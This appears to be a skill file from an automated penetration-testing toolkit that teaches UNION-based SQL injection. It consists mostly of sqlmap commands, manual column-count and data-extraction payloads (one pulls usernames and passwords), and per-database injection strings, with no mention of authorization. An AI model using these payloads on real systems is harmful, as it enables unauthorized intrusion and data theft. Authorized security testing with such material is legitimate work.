# Skill: UNION-Based SQL Injection

## Metadata
- Phase: detection
- Techniques: U
- DB Targets: all
- Risk Level: low
- Prerequisites: application displays query results directly in response

## When to Use

Use when the application **outputs the results of the SQL query in the HTTP response** — product listings, user profiles, search results, etc. UNION-based is the fastest extraction technique when applicable.

Indicators:
- Application shows data from database (product name, user profile, article content)
- Injecting `ORDER BY 5--` breaks the page but `ORDER BY 4--` doesn't (reveals column count)
- Application shows at least one column value from the query in the output

## How UNION-Based Works

Appends a second SELECT to the original query:
```sql
original: SELECT name, price, desc FROM products WHERE id=1
injected: SELECT name, price, desc FROM products WHERE id=0 UNION SELECT username, password, email FROM users--
```

The injected results appear where the legitimate results would have appeared.

## Minimum Viable Command

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=U --batch
```

## Recommended Full Command

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=U \
  --dbms=mysql \
  --batch \
  --union-cols=1-10 \
  --threads=5 \
  -v 2
```

## Manual UNION Detection

### Step 1: Find Column Count (ORDER BY method)
```
?id=1 ORDER BY 1--   (works)
?id=1 ORDER BY 2--   (works)
?id=1 ORDER BY 3--   (works)
?id=1 ORDER BY 4--   (ERROR -> 3 columns!)
```

### Step 2: Find Displayed Columns (NULL method)
```
?id=0 UNION SELECT NULL,NULL,NULL--
?id=0 UNION SELECT 'a',NULL,NULL--   (if 'a' appears -> column 1 is displayed)
?id=0 UNION SELECT NULL,'a',NULL--   (if 'a' appears -> column 2 is displayed)
```

### Step 3: Extract Data
```sql
?id=0 UNION SELECT database(),user(),version()--
?id=0 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
```

## Common UNION Patterns by DBMS

### MySQL
```sql
0 UNION SELECT NULL,NULL,NULL,@@version,NULL--
0 UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
```

### MSSQL
```sql
0 UNION SELECT NULL,NULL,@@version--
0 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
```

### PostgreSQL
```sql
0 UNION SELECT NULL,version(),NULL--
0 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
```

### Oracle
```sql
0 UNION SELECT NULL,banner,NULL FROM v$version--
0 UNION SELECT NULL,table_name,NULL FROM all_tables--
```

## Step-by-Step

1. Confirm application displays data from DB
2. Find column count with ORDER BY
3. Find which columns are reflected in output
4. Run detection command
5. Proceed directly to fast data extraction

## Expected Output
```
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] automatically extending ranges for UNION query injection technique tests
[INFO] target URL appears to be UNION injectable with 3 columns
GET parameter 'id' is vulnerable (UNION based, 3 columns)
```

## Speed Advantage

UNION-based is the fastest extraction method:
- Extract DBMS version: <5 seconds
- Dump 100-row table: 10-60 seconds
- No per-character extraction needed

## Red Flags (wrong skill)
- App doesn't display data from DB (uses data for logic only) -> try error-based or blind
- UNION returns error even after correct column count -> data type mismatch, SQLMap handles this
- Partial UNION (only first column displayed) -> SQLMap handles with `--union-char`

## Follow-Up
- Injection confirmed -> [Database Enumeration](../03_exploitation/database_enumeration.md)
- WAF blocking UNION keyword -> [Tamper Chaining](../02_waf_evasion/tamper_chaining.md)
- UNION + Stacked also work -> enable Stacked for write operations: `--technique=US`
